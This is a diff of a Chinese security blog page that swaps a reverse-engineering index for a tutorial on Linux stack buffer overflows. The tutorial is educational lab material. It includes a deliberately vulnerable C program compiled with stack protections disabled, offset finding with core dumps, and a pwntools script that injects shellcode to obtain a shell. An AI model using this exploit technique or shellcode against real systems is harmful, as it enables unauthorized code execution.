@@ -6,18 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://niwbie.github.io">
-  <title>逆向及病毒分析技术 | isee&#39;blog</title>
+  <title>Linux下的缓冲区溢出攻击(二) | isee&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="整理了一下逆向及病毒分析的学习历程">
+  <meta name="description" content="在（一）中介绍了如何动态调试缓冲区漏洞的过程。但是由于有很多局限没有成功，所以这里简单介绍一下如何使用gdb工具中的dump等来调试程序。
+1234567891011#includevoid func()&amp;#123;    char name[0x50];       read(0, name, 0x100);    write(1, name, 0x100);&amp;#125;int main()&amp;#">
 <meta property="og:type" content="article">
-<meta property="og:title" content="逆向及病毒分析技术">
-<meta property="og:url" content="https://niwbie.github.io/2017/03/19/逆向及病毒分析技术/index.html">
+<meta property="og:title" content="Linux下的缓冲区溢出攻击(二)">
+<meta property="og:url" content="https://niwbie.github.io/2016/11/29/Linux下的缓冲区溢出攻击(二)/index.html">
 <meta property="og:site_name" content="isee'blog">
-<meta property="og:description" content="整理了一下逆向及病毒分析的学习历程">
-<meta property="og:updated_time" content="2017-03-18T06:35:01.468Z">
+<meta property="og:description" content="在（一）中介绍了如何动态调试缓冲区漏洞的过程。但是由于有很多局限没有成功，所以这里简单介绍一下如何使用gdb工具中的dump等来调试程序。
+1234567891011#includevoid func()&amp;#123;    char name[0x50];       read(0, name, 0x100);    write(1, name, 0x100);&amp;#125;int main()&amp;#">
+<meta property="og:image" content="https://niwbie.github.io/image/Linux下的缓冲区溢出攻击/6.png">
+<meta property="og:image" content="https://niwbie.github.io/image/Linux下的缓冲区溢出攻击/7.png">
+<meta property="og:image" content="https://niwbie.github.io/image/Linux下的缓冲区溢出攻击/8.png">
+<meta property="og:image" content="https://niwbie.github.io/image/Linux下的缓冲区溢出攻击/9.png">
+<meta property="og:image" content="https://niwbie.github.io/image/Linux下的缓冲区溢出攻击/10.png">
+<meta property="og:updated_time" content="2017-11-12T07:01:53.656Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="逆向及病毒分析技术">
-<meta name="twitter:description" content="整理了一下逆向及病毒分析的学习历程">
+<meta name="twitter:title" content="Linux下的缓冲区溢出攻击(二)">
+<meta name="twitter:description" content="在（一）中介绍了如何动态调试缓冲区漏洞的过程。但是由于有很多局限没有成功，所以这里简单介绍一下如何使用gdb工具中的dump等来调试程序。
+1234567891011#includevoid func()&amp;#123;    char name[0x50];       read(0, name, 0x100);    write(1, name, 0x100);&amp;#125;int main()&amp;#">
+<meta name="twitter:image" content="https://niwbie.github.io/image/Linux下的缓冲区溢出攻击/6.png">
   
     <link rel="alternative" href="/atom.xml" title="isee&#39;blog" type="application/atom+xml">
   
@@ -133,7 +142,7 @@
 </nav>
 
       <div class="body-wrap">
-        <article id="post-逆向及病毒分析技术" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Linux下的缓冲区溢出攻击(二)" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <input type="hidden" class="isFancy" />
@@ -143,7 +152,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      逆向及病毒分析技术
+      Linux下的缓冲区溢出攻击(二)
     </h1>
   
       
@@ -151,19 +160,32 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="整理了一下逆向及病毒分析的学习历程"><a href="#整理了一下逆向及病毒分析的学习历程" class="headerlink" title="整理了一下逆向及病毒分析的学习历程"></a>整理了一下逆向及病毒分析的学习历程</h1><a id="more"></a>
-<h2 id="逆向部分"><a href="#逆向部分" class="headerlink" title="逆向部分"></a>逆向部分</h2><h3 id="1-第一次逆向分析"><a href="#1-第一次逆向分析" class="headerlink" title="1. 第一次逆向分析"></a>1. <a href="/2015/07/21/第一次逆向分析/index.html">第一次逆向分析</a></h3><h3 id="2-C函数调用和堆栈"><a href="#2-C函数调用和堆栈" class="headerlink" title="2. C函数调用和堆栈"></a>2. <a href="/2016/09/22/C函数调用和堆栈/index.html">C函数调用和堆栈</a></h3><h3 id="3-简单的分配栈帧及溢出修改相邻变量"><a href="#3-简单的分配栈帧及溢出修改相邻变量" class="headerlink" title="3. 简单的分配栈帧及溢出修改相邻变量"></a>3. <a href="/2016/05/11/简单的分配栈帧及溢出修改相邻变量/index.html">简单的分配栈帧及溢出修改相邻变量</a></h3><h3 id="4-JMP指令转换公式"><a href="#4-JMP指令转换公式" class="headerlink" title="4. JMP指令转换公式"></a>4. <a href="/2016/03/17/JMP指令转换公式/index.html">JMP指令转换公式</a></h3><h3 id="5-declspec-naked-作用"><a href="#5-declspec-naked-作用" class="headerlink" title="5. __declspec(naked)作用"></a>5. <a href="/2016/03/17/declspec-naked-详解/index.html">__declspec(naked)作用</a></h3><h3 id="6-retn的作用"><a href="#6-retn的作用" class="headerlink" title="6. retn的作用"></a>6. <a href="/2016/05/17/retn的作用/index.html">retn的作用</a></h3><h3 id="7-一个简单的qq盗号木马分析"><a href="#7-一个简单的qq盗号木马分析" class="headerlink" title="7. 一个简单的qq盗号木马分析"></a>7. <a href="/2016/07/15/一个简单的QQ盗号木马分析/index.html">一个简单的qq盗号木马分析</a></h3><h3 id="8-第一次去除花指令"><a href="#8-第一次去除花指令" class="headerlink" title="8. 第一次去除花指令"></a>8. <a href="/2016/11/20/看雪CrackMe第三题之去除花指令/index.html">第一次去除花指令</a></h3><h3 id="9-一道简单的去花指令练习"><a href="#9-一道简单的去花指令练习" class="headerlink" title="9. 一道简单的去花指令练习"></a>9. <a href="/2017/03/17/一道E语言的CTF题/index.html">一道简单的去花指令练习</a></h3><h3 id="10-文件补丁"><a href="#10-文件补丁" class="headerlink" title="10. 文件补丁"></a>10. <a href="/2017/03/17/文件补丁/index.html">文件补丁</a></h3><h3 id="11-逆向之RC4算法"><a href="#11-逆向之RC4算法" class="headerlink" title="11. 逆向之RC4算法"></a>11. <a href="/2016/11/19/看雪CTF-2016第五题Writeup/index.html">逆向之RC4算法</a></h3><h3 id="12-逆向进阶之调试多线程程序"><a href="#12-逆向进阶之调试多线程程序" class="headerlink" title="12. 逆向进阶之调试多线程程序"></a>12. <a href="/2016/10/20/爆破一个多线程E语言程序/index.html">逆向进阶之调试多线程程序</a></h3><h3 id="13-又一道多线程调试的练习"><a href="#13-又一道多线程调试的练习" class="headerlink" title="13. 又一道多线程调试的练习"></a>13. <a href="/2016/12/15/看雪CTF-2016第二十题Writeup/index.html">又一道多线程调试的练习</a></h3><h3 id="14-CTF题之shim技术以及-shim详解-http-www-freebuf-com-articles-system-114287-html-gt"><a href="#14-CTF题之shim技术以及-shim详解-http-www-freebuf-com-articles-system-114287-html-gt" class="headerlink" title="14. CTF题之shim技术以及[shim详解](http://www.freebuf.com/articles/system/114287.html&gt;"></a>14. <a href="/2016/12/06/看雪CTF-2016第十四题Writeup/index.html">CTF题之shim技术</a>以及[shim详解](<a href="http://www.freebuf.com/articles/system/114287.html&gt;" target="_blank" rel="external">http://www.freebuf.com/articles/system/114287.html&gt;</a></h3><h3 id="15-一道有意思CTF题–走迷宫"><a href="#15-一道有意思CTF题–走迷宫" class="headerlink" title="15. 一道有意思CTF题–走迷宫"></a>15. <a href="/2017/03/11/百度CTF-reverse1/index.html">一道有意思CTF题–走迷宫</a></h3><h3 id="16-Linux下x64程序的函数调用和堆栈"><a href="#16-Linux下x64程序的函数调用和堆栈" class="headerlink" title="16. Linux下x64程序的函数调用和堆栈"></a>16. <a href="/2017/03/14/Linux下x64程序的函数调用和堆栈/index.html">Linux下x64程序的函数调用和堆栈</a></h3><h3 id="17-一道简单的Linux-x64逆向"><a href="#17-一道简单的Linux-x64逆向" class="headerlink" title="17. 一道简单的Linux x64逆向"></a>17. <a href="/2017/03/18/一道简单的Linux-x64逆向/index.html">一道简单的Linux x64逆向</a></h3>
+        <p>在（一）中介绍了如何动态调试缓冲区漏洞的过程。但是由于有很多局限没有成功，所以这里简单介绍一下如何使用gdb工具中的dump等来调试程序。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#include</div><div class="line">void func()&#123;</div><div class="line">    char name[0x50];   </div><div class="line">    read(0, name, 0x100);    write(1, name, 0x100);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    func();</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -m32 1.c -o 1 -O0 -fno-stack-protector -z execstack</div></pre></td></tr></table></figure></p>
+<p>m32:生成32bit程序需要gcc-multilib(x86机器上编译不用加)<br>O0:不进行任何优化<br>fno-stack-protector:不开启canary栈溢出检测<br>z execstack:开启栈可执行关闭NX</p>
+<p>从IDA可以看出 ebp-0x58和ebp+0x4相差了92个字节,即ret的地址。<br><img src="/image/Linux下的缓冲区溢出攻击/6.png" alt="这里写图片描述"></p>
+<p>其实也可以用pattern_create和pattern_offset：</p>
+<p>生成：<br><img src="/image/Linux下的缓冲区溢出攻击/7.png" alt="这里写图片描述"></p>
+<p>将这段复制到输入，然后用pattern_offset：<br><img src="/image/Linux下的缓冲区溢出攻击/8.png" alt="这里写图片描述"></p>
+<p>上一节说了，由于gdb调试时和程序运行时也有差别，所以这里需要开启core dump来查看栈地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ulimit -c unlimited</div></pre></td></tr></table></figure></p>
+<p>然后调试程序，让其崩溃：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">s = process(&apos;./olverflow&apos;)</div><div class="line">payload = &apos;a&apos;*92</div><div class="line">payload += p32(0x11111111)</div><div class="line">pay += &apos;A&apos;*10</div><div class="line"></div><div class="line">s.send(payload)</div><div class="line">s.interactive()</div></pre></td></tr></table></figure></p>
+<p>然后生成了一个core.xxx的文件，使用gdb -c core.xxx调试它：<br><img src="/image/Linux下的缓冲区溢出攻击/9.png" alt="这里写图片描述"></p>
+<p>可以看到我们后面输入的A（0x41）的地址为0xffffd0d0，所以网上找<a href="https://www.exploit-db.com/exploits/13312/" target="_blank" rel="external">shellcode</a>，并将py程序改为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">s = process(&apos;./olverflow&apos;)</div><div class="line">payload = &apos;a&apos;*92</div><div class="line">payload += p32(0xffffd0d0)</div><div class="line">payload += &quot;\xeb\x11\x5e\x31\xc9\xb1\x32\x80&quot;</div><div class="line">payload += &quot;\x6c\x0e\xff\x01\x80\xe9\x01\x75&quot;</div><div class="line">payload += &quot;\xf6\xeb\x05\xe8\xea\xff\xff\xff&quot;</div><div class="line">payload += &quot;\x32\xc1\x51\x69\x30\x30\x74\x69&quot;</div><div class="line">payload += &quot;\x69\x30\x63\x6a\x6f\x8a\xe4\x51&quot;</div><div class="line">payload += &quot;\x54\x8a\xe2\x9a\xb1\x0c\xce\x81&quot;</div><div class="line"></div><div class="line">s.send(payload)</div><div class="line">s.interactive()</div></pre></td></tr></table></figure>
+<p><img src="/image/Linux下的缓冲区溢出攻击/10.png" alt="这里写图片描述"><br>得到shell</p>
+
       
     </div>
     <div class="article-info article-info-index">
       
-      <a href="/2017/03/19/逆向及病毒分析技术/" class="archive-article-date">
-  	<time datetime="2017-03-19T08:05:41.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-03-19</time>
+      <a href="/2016/11/29/Linux下的缓冲区溢出攻击(二)/" class="archive-article-date">
+  	<time datetime="2016-11-29T06:15:25.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-11-29</time>
 </a>
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
 	</div>
 
       
@@ -176,18 +198,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/11/12/一道doublefree的pwn/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2016/12/03/Linux下的缓冲区溢出攻击(三)/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          一道doublefree的pwn
+          Linux下的缓冲区溢出攻击(三)
         
       </div>
     </a>
   
   
-    <a href="/2017/03/18/一道简单的Linux-x64逆向/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">一道简单的Linux x64逆向</div>
+    <a href="/2016/11/21/Linux下的缓冲区溢出攻击(一)/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Linux下的缓冲区溢出攻击(一)</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -221,7 +243,7 @@
 
 <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="逆向及病毒分析技术" data-title="逆向及病毒分析技术" data-url="https://niwbie.github.io/2017/03/19/逆向及病毒分析技术/"></div>
+	<div class="ds-thread" data-thread-key="Linux下的缓冲区溢出攻击(二)" data-title="Linux下的缓冲区溢出攻击(二)" data-url="https://niwbie.github.io/2016/11/29/Linux下的缓冲区溢出攻击(二)/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
